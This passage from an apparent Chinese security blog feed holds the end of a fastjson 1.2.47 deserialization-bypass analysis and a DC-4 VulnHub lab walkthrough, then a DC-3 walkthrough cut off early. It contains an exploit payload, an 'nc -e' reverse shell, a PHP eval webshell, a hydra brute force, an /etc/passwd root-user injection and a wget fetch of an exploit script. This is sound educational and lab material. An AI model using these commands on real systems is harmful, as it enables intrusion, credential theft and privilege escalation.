class="keyword">if</span> (clazz == <span class="literal">null</span>) &#123;</span><br><span class="line">            clazz = deserializers.findClass(typeName);<span class="comment">//如果没有，就继续在反序列化器里找</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//继续走到这里</span></span><br><span class="line">        <span class="keyword">if</span> (clazz != <span class="literal">null</span>) &#123; <span class="comment">//如果在上面的缓存里找到了，做一个简单的判断</span></span><br><span class="line">            <span class="keyword">if</span> (expectClass != <span class="literal">null</span> &amp;&amp; !expectClass.isAssignableFrom(clazz)) &#123;</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">JSONException</span>(<span class="string">&quot;type not match. &quot;</span> + typeName + <span class="string">&quot; -&gt; &quot;</span> + expectClass.getName());</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">return</span> clazz;<span class="comment">//不满足if，返回类</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//继续往下</span></span><br><span class="line">        <span class="keyword">if</span> (!autoTypeSupport) &#123; <span class="comment">//autoTypeSupport默认为空，进入到这个if分支</span></span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; denyList.length; ++i) &#123;</span><br><span class="line">                <span class="type">String</span> <span class="variable">deny</span> <span class="operator">=</span> denyList[i];</span><br><span class="line">                <span class="keyword">if</span> (className.startsWith(deny)) &#123; </span><br><span class="line">                    <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">JSONException</span>(<span class="string">&quot;autoType is not support. &quot;</span> + typeName);</span><br><span class="line">                &#125; <span class="comment">//黑名单检测到抛出异常，也就是之前payload打不通，报出的异常错误</span></span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; acceptList.length; ++i) &#123;</span><br><span class="line">                <span class="type">String</span> <span class="variable">accept</span> <span class="operator">=</span> acceptList[i];</span><br><span class="line">                <span class="keyword">if</span> (className.startsWith(accept)) &#123;  <span class="comment">//在白名单里 loadClass加载类</span></span><br><span class="line">                    clazz = TypeUtils.loadClass(typeName, defaultClassLoader);</span><br><span class="line"></span><br><span class="line">                    <span class="keyword">if</span> (expectClass != <span class="literal">null</span> &amp;&amp; expectClass.isAssignableFrom(clazz)) &#123;</span><br><span class="line">                        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">JSONException</span>(<span class="string">&quot;type not match. &quot;</span> + typeName + <span class="string">&quot; -&gt; &quot;</span> + expectClass.getName());</span><br><span class="line">                    &#125;</span><br><span class="line">                    <span class="keyword">return</span> clazz;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"><span class="comment">//只要开启了autoTypeSupport，就会走到这里进行类加载</span></span><br><span class="line">        <span class="keyword">if</span> (autoTypeSupport || expectClass != <span class="literal">null</span>) &#123;</span><br><span class="line">            clazz = TypeUtils.loadClass(typeName, defaultClassLoader);</span><br><span class="line">        &#125;</span><br><span class="line">     </span><br><span class="line">        <span class="keyword">if</span> (clazz != <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="comment">//检测是否为这几个类的子类，抛出异常，后面不重要，不说了</span></span><br><span class="line">            <span class="keyword">if</span> (ClassLoader.class.isAssignableFrom(clazz) <span class="comment">// classloader is danger</span></span><br><span class="line">                    || DataSource.class.isAssignableFrom(clazz) <span class="comment">// dataSource can load jdbc driver</span></span><br><span class="line">                    ) &#123;</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">JSONException</span>(<span class="string">&quot;autoType is not support. &quot;</span> + typeName);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (expectClass != <span class="literal">null</span>) &#123;</span><br><span class="line">                <span class="keyword">if</span> (expectClass.isAssignableFrom(clazz)) &#123;</span><br><span class="line">                    <span class="keyword">return</span> clazz;</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">JSONException</span>(<span class="string">&quot;type not match. &quot;</span> + typeName + <span class="string">&quot; -&gt; &quot;</span> + expectClass.getName());</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (!autoTypeSupport) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">JSONException</span>(<span class="string">&quot;autoType is not support. &quot;</span> + typeName);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> clazz;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这个函数加了黑白名单做限制，白名单默认为空，黑名单里的类写死了改不了。</p><img src="/2023/07/19/fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-1-2-47%E7%BB%95%E8%BF%87/3.png" class><p>有很多，里面也包含了com.sun包下的漏洞类。当然，黑白名单这里我们是没法绕过去的，那么就找一下有什么特殊情况可以返回我们反序列化的恶意类。</p><h3 id="寻找利用点"><a href="#寻找利用点" class="headerlink" title="寻找利用点"></a>寻找利用点</h3><p>在我们对checkAutoType函数逻辑分析的时候，有这么一段代码：</p><img src="/2023/07/19/fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-1-2-47%E7%BB%95%E8%BF%87/4.png" class><p>它会从mapping缓存和反序列化器里面找有没有与之对应的类，然后返回我们的类。如果我们可以将恶意的类放进缓存中，它直接从缓存里拿并反序列化，就绕过了所谓的安全限制。这也就是接下来主要分析的1.2.47版本之前的绕过手法。</p><p>如果开启了，或者说我们能够开启autoTypeSupport开关，</p><img src="/2023/07/19/fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-1-2-47%E7%BB%95%E8%BF%87/5.png" class><p>直接可以loadClass，那就简单多了，本篇文章不主要讲。</p><h2 id="0x03-fastjson-lt-x3D-1-2-47绕过方法分析"><a href="#0x03-fastjson-lt-x3D-1-2-47绕过方法分析" class="headerlink" title="0x03 fastjson&lt;&#x3D;1.2.47绕过方法分析"></a>0x03 fastjson&lt;&#x3D;1.2.47绕过方法分析</h2><p>跟进到getClassFromMapping方法</p><img src="/2023/07/19/fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-1-2-47%E7%BB%95%E8%BF%87/6.png" class><h3 id="TypeUtils-loadClass"><a href="#TypeUtils-loadClass" class="headerlink" title="TypeUtils.loadClass"></a>TypeUtils.loadClass</h3><p>mappings继承了HashMap，查找用法看看有哪些地方可以put进去我们的恶意类。可以利用的地方在TypeUtils类的loadClass方法里。</p><img src="/2023/07/19/fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-1-2-47%E7%BB%95%E8%BF%87/7.png" class><p>classLoader默认为null，自然会走到这个if里面，如果className赋值为我们的恶意类，就可以放到缓存里面了。继续查找方法看看什么地方调用了TypeUtils的loadClass方法。</p><h3 id="MiscCodec-deserialze"><a href="#MiscCodec-deserialze" class="headerlink" title="MiscCodec.deserialze"></a>MiscCodec.deserialze</h3><p>在MiscCodec类的deserialze方法里</p><img src="/2023/07/19/fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-1-2-47%E7%BB%95%E8%BF%87/8.png" class><p>如果clazz是Class类型的话，就调用这个loadClass方法，先看看MiscCodec是个什么东西</p><img src="/2023/07/19/fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-1-2-47%E7%BB%95%E8%BF%87/9.png" class><p>很明显，它是一个反序列化器。那什么情况下调用该反序列化器的deserialze方法呢？在DefaultJSONParser类中有这样一段逻辑：</p><img src="/2023/07/19/fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-1-2-47%E7%BB%95%E8%BF%87/10.png" class><p>其实checkAutoType函数检测返回类后是会走到这里来的，它从config中，也就是ParserConfig类中获取反序列化器，然后从获取来的反序列化器反序列化我们的类。</p><img src="/2023/07/19/fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-1-2-47%E7%BB%95%E8%BF%87/11.png" class><p>可以看一下deserializers的默认配置</p><img src="/2023/07/19/fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-1-2-47%E7%BB%95%E8%BF%87/12.png" class><p>有很多，指定的类对应不同的反序列化器，这里Class类型的类也是默认用MiscCodec反序列化器，那么就与上文调用loadClass的那个if判断对接上了。还有一个细小的代码段：</p><img src="/2023/07/19/fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-1-2-47%E7%BB%95%E8%BF%87/13.png" class><p>检测传入的JSON串的键值是否为val，如果不为val，就抛出异常，这点在写payload的时候要注意。</p><h3 id="思路整理与利用"><a href="#思路整理与利用" class="headerlink" title="思路整理与利用"></a>思路整理与利用</h3><p>目的是为了让我们的恶意类放入缓存中，可以提前反序列化一个java.lang.Class类，添加val属性，属性值为执行的恶意类，它会走到TypeUtils的loadClass方法中，将恶意类添加到缓存中，然后反序列化我们的恶意类，它会直接从缓存里拿，从而绕过安全检测。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">java.lang.Class--&gt;MiscCodec.deserialze--&gt;TypeUtils.loadClass--&gt;mappings.put</span><br><span class="line">com.sun.rowset.JdbcRowSetImpl--&gt;checkAutoType--&gt;mappings.get--&gt;反序列化执行恶意代码</span><br></pre></td></tr></table></figure><p>编写exp：</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> fastjson.test3;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.JSON;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">fastjsonbypass1</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String [] args)</span>&#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">s</span> <span class="operator">=</span> <span class="string">&quot;&#123;&#123;\&quot;@type\&quot;:\&quot;java.lang.Class\&quot;,\&quot;val\&quot;:\&quot;com.sun.rowset.JdbcRowSetImpl\&quot;&#125;,&#123;\&quot;@type\&quot;:\&quot;com.sun.rowset.JdbcRowSetImpl\&quot;,\&quot;DataSourceName\&quot;:\&quot;ldap://127.0.0.1:8085/yQxERbdt\&quot;,\&quot;autoCommit\&quot;:\&quot;false\&quot;&#125;&#125;&quot;</span>;</span><br><span class="line">        JSON.parseObject(s);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>运行代码</p><img src="/2023/07/19/fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-1-2-47%E7%BB%95%E8%BF%87/14.png" class><h3 id="调试与分析"><a href="#调试与分析" class="headerlink" title="调试与分析"></a>调试与分析</h3><p>可以调试看一下，只看关键部分</p><img src="/2023/07/19/fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-1-2-47%E7%BB%95%E8%BF%87/15.png" class><p>进入到checkAutoType函数，此时的typeName是java.lang.Class</p><img src="/2023/07/19/fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-1-2-47%E7%BB%95%E8%BF%87/16.png" class><p>这个类可以直接从缓存里面找到，然后直接返回类</p><img src="/2023/07/19/fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-1-2-47%E7%BB%95%E8%BF%87/17.png" class><p>然后就到了最下面，根据typeName去查找对应的反序列化器，这里我们可以看到反序列化器类是MiscCodec类，接下来就是调用它的deserialize函数</p><img src="/2023/07/19/fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-1-2-47%E7%BB%95%E8%BF%87/18.png" class><p>此时满足这个if条件，去调用loadClass，strVal已经赋值为我们的恶意类了</p><img src="/2023/07/19/fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-1-2-47%E7%BB%95%E8%BF%87/19.png" class><p>可以看到mappings里面已经有我们的恶意类了，然后到了下一轮，开始反序列化第二个@type，也就是恶意类</p><img src="/2023/07/19/fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-1-2-47%E7%BB%95%E8%BF%87/20.png" class><p>在这个安全函数里，typeName已经换成了com.sun.rowset.JdbcRowSetImpl</p><img src="/2023/07/19/fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-1-2-47%E7%BB%95%E8%BF%87/21.png" class><p>缓存里面有，直接拿了，没有走到黑白名单检测那里，直接返回。后续就正常反序列化执行恶意代码了，不再看了。这种绕过手法在fastjson的1.2.25到1.2.47版本下都是能用的。</p><h3 id="简单说说开启AutoTypeSupport的利用"><a href="#简单说说开启AutoTypeSupport的利用" class="headerlink" title="简单说说开启AutoTypeSupport的利用"></a>简单说说开启AutoTypeSupport的利用</h3><p>上面总结的在缓存里放恶意类的利用手法前提是不开启这个开关，当然默认也是不开启的。那么如果开启了，回看上面的代码，其实更简单了</p><img src="/2023/07/19/fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-1-2-47%E7%BB%95%E8%BF%87/22.png" class><p>直接loadClass了，当然前面需要经过黑名单的检测，那么问题就变成了如何绕过黑名单了。本次用的fastjson版本是1.2.25，就拿这个版本分析一下。看一下loadClass函数</p><img src="/2023/07/19/fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-1-2-47%E7%BB%95%E8%BF%87/23.png" class><p>重点是这段代码，检测反序列化的类开头是否是L，结尾是否是分号。如果是，就去掉，再进行loadClass，一个递归操作。如果修改恶意类是这样子</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Lcom.sun.rowset.JdbcRowSetImpl;</span><br></pre></td></tr></table></figure><p>就可以绕过黑名单，另外在检测到L和分号的时候去空，就可以正常的反序列化了。</p><img src="/2023/07/19/fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-1-2-47%E7%BB%95%E8%BF%87/24.png" class><p>后续版本可能做了修复，但是在开启AutoTypeSupport的前提下，还是有办法绕过黑名单。可以参考以下文章：</p><p><a href="https://drun1baby.top/2022/08/08/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96Fastjson%E7%AF%8703-Fastjson%E5%90%84%E7%89%88%E6%9C%AC%E7%BB%95%E8%BF%87%E5%88%86%E6%9E%90/#Java-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-Fastjson-%E7%AF%87-03-Fastjson-%E5%90%84%E7%89%88%E6%9C%AC%E7%BB%95%E8%BF%87%E5%88%86%E6%9E%90">Java反序列化Fastjson篇03-Fastjson各版本绕过分析</a></p><h2 id="0x04-小结"><a href="#0x04-小结" class="headerlink" title="0x04  小结"></a>0x04  小结</h2><p> 本篇文章主要分析了fastjson在1.2.25到1.2.47版本下的漏洞利用，后续在更高版本的fastjson，这个利用手法也是打不通的，在后续的时间里，我会继续分析更高版本，例如1.2.68的反序列化漏洞利用。</p><p>反序列化之路任重而道远</p>]]></content>
      
      
      <categories>
          
          <category> java安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> java </tag>
            
            <tag> 反序列化 </tag>
            
            <tag> Fastjson </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>DC-4靶机通关记录</title>
      <link href="/2023/07/18/DC-4%E9%9D%B6%E6%9C%BA%E9%80%9A%E5%85%B3%E8%AE%B0%E5%BD%95/"/>
      <url>/2023/07/18/DC-4%E9%9D%B6%E6%9C%BA%E9%80%9A%E5%85%B3%E8%AE%B0%E5%BD%95/</url>
      
        <content type="html"><![CDATA[<h3 id="靶场环境"><a href="#靶场环境" class="headerlink" title="靶场环境"></a>靶场环境</h3><blockquote><p>局域网网段：192.168.47.0&#x2F;24</p><p>攻击机 kali：192.168.47.138&#x2F;24</p><p>目标器 DC-3：192.168.47.139&#x2F;24</p></blockquote><h3 id="打靶目标"><a href="#打靶目标" class="headerlink" title="打靶目标"></a>打靶目标</h3><blockquote><p>找到藏在DC-4靶机中的flag，只有最终的flag。</p></blockquote><h3 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h3><p>已知目标机器和攻击机器在同一个局域网内，网段为192.168.47.0&#x2F;24。</p><h4 id="寻找靶机真实IP"><a href="#寻找靶机真实IP" class="headerlink" title="寻找靶机真实IP"></a>寻找靶机真实IP</h4><p>同样使用nmap扫描网段内的ip，使用命令：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nmap -sP 192.168.47.0/24</span><br><span class="line">-sP参数常用于发现主机，而不进行端口扫描，使用ping，也就是发送icmp数据包，探测ip段内的主机是否在线</span><br></pre></td></tr></table></figure><img src="/2023/07/18/DC-4%E9%9D%B6%E6%9C%BA%E9%80%9A%E5%85%B3%E8%AE%B0%E5%BD%95/1.png" class><p>目标机器IP：192.168.47.139</p><h4 id="探测服务以及端口"><a href="#探测服务以及端口" class="headerlink" title="探测服务以及端口"></a>探测服务以及端口</h4><p>nmap使用命令</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nmap -A -p- -v 192.168.47.139/24</span><br><span class="line">-A表示全面扫描，包括端口，服务，操作系统等等。-p-是扫描主机开放的全部端口，而不只是常见的端口。-v就是显示更详细的扫描结果和信息。</span><br></pre></td></tr></table></figure><img src="/2023/07/18/DC-4%E9%9D%B6%E6%9C%BA%E9%80%9A%E5%85%B3%E8%AE%B0%E5%BD%95/2.png" class><p>靶机开放了web服务和ssh服务，web服务没有扫描到特定的框架。先游览器访问，</p><img src="/2023/07/18/DC-4%E9%9D%B6%E6%9C%BA%E9%80%9A%E5%85%B3%E8%AE%B0%E5%BD%95/3.png" class><p>打开就是登录框了，看来是要登录进去了，获取最终的flag。</p><h3 id="寻找最终flag"><a href="#寻找最终flag" class="headerlink" title="寻找最终flag"></a>寻找最终flag</h3><h4 id="爆破账户密码"><a href="#爆破账户密码" class="headerlink" title="爆破账户密码"></a>爆破账户密码</h4><p>只有一个登录框，也没有别的什么目录文件，看来确实要登录进去了。要么弱口令要么爆破。弱口令试了几次没有成功，那么就开始爆破吧，针对于爆破，字典要选对。burp抓包，爆破，用户名就默认为admin</p><img src="/2023/07/18/DC-4%E9%9D%B6%E6%9C%BA%E9%80%9A%E5%85%B3%E8%AE%B0%E5%BD%95/4.png" class><p>以下这几个密码都可以登录进去，用happy作为密码登录</p><img src="/2023/07/18/DC-4%E9%9D%B6%E6%9C%BA%E9%80%9A%E5%85%B3%E8%AE%B0%E5%BD%95/5.png" class><p>登录成功。</p><h4 id="命令执行getshell"><a href="#命令执行getshell" class="headerlink" title="命令执行getshell"></a>命令执行getshell</h4><p>点进去Command，发现可以执行三个命令，</p><img src="/2023/07/18/DC-4%E9%9D%B6%E6%9C%BA%E9%80%9A%E5%85%B3%E8%AE%B0%E5%BD%95/6.png" class><p>如果网站是在前端限制了我们执行的命令只能是这三个，那么我们就可以抓包修改任意命令执行了。</p><img src="/2023/07/18/DC-4%E9%9D%B6%E6%9C%BA%E9%80%9A%E5%85%B3%E8%AE%B0%E5%BD%95/7.png" class><p>可以任意命令执行，本来下一步尝试写马进去，可是根本写不进去。</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">echo &quot;&lt;?php eval($_POST[123]);?&gt;&quot;&gt;123.php</span><br></pre></td></tr></table></figure><p>后来才知道www-data的权限太低了，连文件都创建不了。看一下执行命令的代码逻辑：</p><img src="/2023/07/18/DC-4%E9%9D%B6%E6%9C%BA%E9%80%9A%E5%85%B3%E8%AE%B0%E5%BD%95/8.png" class><p>尝试使用反弹shell，把shell反弹到kali机上。kali机监听9955端口</p><p>执行的命令为：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nc -e /bin/bash 192.168.47.138 9955</span><br></pre></td></tr></table></figure><p>注意在http报文中修改的时候将空格url编码一下。</p><img src="/2023/07/18/DC-4%E9%9D%B6%E6%9C%BA%E9%80%9A%E5%85%B3%E8%AE%B0%E5%BD%95/9.png" class><p>成功反弹到kali机上，老样子，优化一下shell</p><img src="/2023/07/18/DC-4%E9%9D%B6%E6%9C%BA%E9%80%9A%E5%85%B3%E8%AE%B0%E5%BD%95/10.png" class><p>下一步就得提权了。</p><h4 id="Linux提权"><a href="#Linux提权" class="headerlink" title="Linux提权"></a>Linux提权</h4><p>这里看文章有两种提权的方法，索性都记录下来，增加知识面</p><h5 id="hydra爆破ssh密码"><a href="#hydra爆破ssh密码" class="headerlink" title="hydra爆破ssh密码"></a>hydra爆破ssh密码</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Hydra 是一个开源的密码爆破工具，用于渗透测试和安全评估。它被设计用于在授权范围内的测试中测试密码弱点，以帮助确认系统的安全性。</span><br><span class="line"></span><br><span class="line">Hydra 具有多协议支持，包括常见的协议和服务，如 SSH、FTP、HTTP、SMTP 等。它使用字典攻击和暴力破解等技术，尝试使用大量的用户名和密码组合来破解目标系统的认证机制。</span><br></pre></td></tr></table></figure><p>ssh服务还没有用到，进入到home目录有三个用户，随便找找发现一个记录密码的备份文件</p><img src="/2023/07/18/DC-4%E9%9D%B6%E6%9C%BA%E9%80%9A%E5%85%B3%E8%AE%B0%E5%BD%95/11.png" class><p>把这些密码保存下来，可以作为爆破字典。接下来就用工具爆破jim的ssh密码。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">hydra -l jim -P /home/xilitter/桌面/new_password.txt 192.168.47.139 ssh</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">说一下hydra工具的几个使用参数：</span><br><span class="line">-l 指定的用户名   -P 指定包含密码列表的文件  -t 指定并行线程数   -s 指定服务的端口号  -f 在成功找到用户名/密码组合后立即停止攻击  -e 指定要尝试的特定模块  -o 将结果保存到指定的输出文件中</span><br></pre></td></tr></table></figure><p>爆破出了密码为jibril04。</p><h5 id="ssh远程连接"><a href="#ssh远程连接" class="headerlink" title="ssh远程连接"></a>ssh远程连接</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ssh jim@192.168.47.139</span><br></pre></td></tr></table></figure><img src="/2023/07/18/DC-4%E9%9D%B6%E6%9C%BA%E9%80%9A%E5%85%B3%E8%AE%B0%E5%BD%95/12.png" class><p>登录成功，随便找找发现charles用户的密码</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/var/spool/mail</span><br></pre></td></tr></table></figure><p>在此路径下的一封邮件里：</p><img src="/2023/07/18/DC-4%E9%9D%B6%E6%9C%BA%E9%80%9A%E5%85%B3%E8%AE%B0%E5%BD%95/13.png" class><p>Charles的密码为^xHhA&amp;hvim0y，尝试切换用户登录</p><img src="/2023/07/18/DC-4%E9%9D%B6%E6%9C%BA%E9%80%9A%E5%85%B3%E8%AE%B0%E5%BD%95/14.png" class><p>成功切换。</p><h5 id="teehee提权"><a href="#teehee提权" class="headerlink" title="teehee提权"></a>teehee提权</h5><p>使用命令sudo -l查看一下该用户可以用特级权限使用哪些命令。</p><img src="/2023/07/18/DC-4%E9%9D%B6%E6%9C%BA%E9%80%9A%E5%85%B3%E8%AE%B0%E5%BD%95/15.png" class><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">teehee是个小众的linux编辑器，如果它具有sudo权限，那么就可以利用并且提权。</span><br></pre></td></tr></table></figure><p>使用以下命令提权</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">echo &quot;admin::0:0:::/bin/bash&quot; | sudo teehee -a /etc/passwd</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">将admin::0:0:::/bin/bash写进/etc/passwd里</span><br><span class="line">&quot;admin&quot;是用户名，&quot;::&quot;是密码字段，表示没有设置密码。</span><br><span class="line">&quot;0:0&quot;是用户ID和组ID    &quot;::&quot;是用户信息字段</span><br><span class="line">&quot;/bin/bash&quot;是登录时使用的默认的shell</span><br><span class="line">没有设置密码的admin为管理员权限，运行shell即可提升权限</span><br></pre></td></tr></table></figure><p>切换admin用户，成功提升权限。</p><img src="/2023/07/18/DC-4%E9%9D%B6%E6%9C%BA%E9%80%9A%E5%85%B3%E8%AE%B0%E5%BD%95/16.png" class><h4 id="exim4提权"><a href="#exim4提权" class="headerlink" title="exim4提权"></a>exim4提权</h4><p>记录一下另一种提权方法。</p><p>当前权限：</p><img src="/2023/07/18/DC-4%E9%9D%B6%E6%9C%BA%E9%80%9A%E5%85%B3%E8%AE%B0%E5%BD%95/17.png" class><p>查看具有SUID权限的命令</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">find / -user root -perm -4000 -print 2&gt;/dev/null</span><br></pre></td></tr></table></figure><img src="/2023/07/18/DC-4%E9%9D%B6%E6%9C%BA%E9%80%9A%E5%85%B3%E8%AE%B0%E5%BD%95/18.png" class><p>exim4具有SUID权限，另外它也是可以用来提权的。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Exim4 是一个开源的邮件传输代理（Mail Transfer Agent，MTA），用于在 Unix/Linux 系统上路由和传递电子邮件。作为一个 MTA，Exim4 负责接收来自发送者的邮件，并将其传递给目标收件人的邮件服务器。</span><br></pre></td></tr></table></figure><p>查看Exim4的版本</p><img src="/2023/07/18/DC-4%E9%9D%B6%E6%9C%BA%E9%80%9A%E5%85%B3%E8%AE%B0%E5%BD%95/19.png" class><p>从本地库中查找相关漏洞。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">searchsploit exim 4 </span><br></pre></td></tr></table></figure><img src="/2023/07/18/DC-4%E9%9D%B6%E6%9C%BA%E9%80%9A%E5%85%B3%E8%AE%B0%E5%BD%95/20.png" class><p>对应版本是有漏洞的，需要下载提权脚本到靶机。</p><p>kali机开启web服务，因为需要靶机从我们的kali机上下载提权脚本，木马也写不进去，只能这么做了。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">systemctl start apache2.service  </span><br></pre></td></tr></table></figure><p>将提权脚本复制到kali机的web根目录下面</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cp /usr/share/exploitdb/exploits/linux/local/46996.sh /var/www/html </span><br></pre></td></tr></table></figure><p>靶机从kali机上wget下载脚本，切换到tmp目录下进行下载，还是那句话，权限太低了。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">wget http://192.168.47.138/46996.sh</span><br></pre></td></tr></table></figure><img src="/2023/07/18/DC-4%E9%9D%B6%E6%9C%BA%E9%80%9A%E5%85%B3%E8%AE%B0%E5%BD%95/21.png" class><p>下载成功后，给脚本加执行权限，然后执行脚本</p><img src="/2023/07/18/DC-4%E9%9D%B6%E6%9C%BA%E9%80%9A%E5%85%B3%E8%AE%B0%E5%BD%95/22.png" class><p>成功提升权限。</p><img src="/2023/07/18/DC-4%E9%9D%B6%E6%9C%BA%E9%80%9A%E5%85%B3%E8%AE%B0%E5%BD%95/23.png" class><p>root目录下找到最后的flag，DC-4靶机通关结束。</p>]]></content>
      
      
      <categories>
          
          <category> 打靶记录 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> vulnhub </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>DC-3靶机通关记录</title>
      <link href="/2023/07/17/DC-3%E9%9D%B6%E6%9C%BA%E9%80%9A%E5%85%B3%E8%AE%B0%E5%BD%95/"/>
      <url>/2023/07/17/DC-3%E9%9D%B6%E6%9C%BA%E9%80%9A%E5%85%B3%E8%AE%B0%E5%BD%95/</url>
      
        <content type="html"><![CDATA[<h3 id="靶场环境"><a href="#靶场环境" class="headerlink" title="靶场环境"></a>靶场环境</h3><blockquote><p>局域网网段：192.168.47.0&#x2F;24</p><p>攻击机 kali：192.168.47.138&#x2F;24</p><p>目标器 DC-3：192.168.47.137&#x2F;24</p></blockquote><h3 id="打靶目标"><a href="#打靶目标" class="headerlink" title="打靶目标"></a>打靶目标</h3><blockquote><p>找到藏在DC-3靶机中的flag，只有最终的flag。</p></blockquote><h3 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h3><p>已知目标机器和攻击机器在同一个局域网内，网段为192.168.47.0&#x2F;24。</p><h4 id="寻找靶机真实IP"><a href="#寻找靶机真实IP" class="headerlink" title="寻找靶机真实IP"></a>寻找靶机真实IP</h4><p>同样使用nmap扫描网段内的ip，使用命令：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nmap -sP 192.168.47.0/24</span><br><span class="line">-sP参数常用于发现主机，而不进行端口扫描，使用ping，也就是发送icmp数据包，探测ip段内的主机是否在线</span><br></pre></td></tr></table></figure><img src="/2023/07/17/DC-3%E9%9D%B6%E6%9C%BA%E9%80%9A%E5%85%B3%E8%AE%B0%E5%BD%95/1.png" class><p>目标机器IP：192.168.47.137</p><h4 id="探测服务以及端口"><a href="#探测服务以及端口" class="headerlink" title="探测服务以及端口"></a>探测服务以及端口</h4><p>nmap使用命令</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nmap -A -p- -v 192.168.47.137/24</span><br><span class="line">-A表示全面扫描，包括端口，服务，操作系统等等。-p-是扫描主机开放的全部端口，而不只是常见的端口。-v就是显示更详细的扫描结果和信息。</span><br></pre></td></tr></table></figure><img src="/2023/07/17/DC-3%E9%9D%B6%E6%9C%BA%E9%80%9A%E5%85%B3%E8%AE%B0%E5%BD%95/2.png" class><p>只开放了80端口，web使用的框架是Joomla。那么主要就是从CMS漏洞这块入手了，游览器访问，</p><img 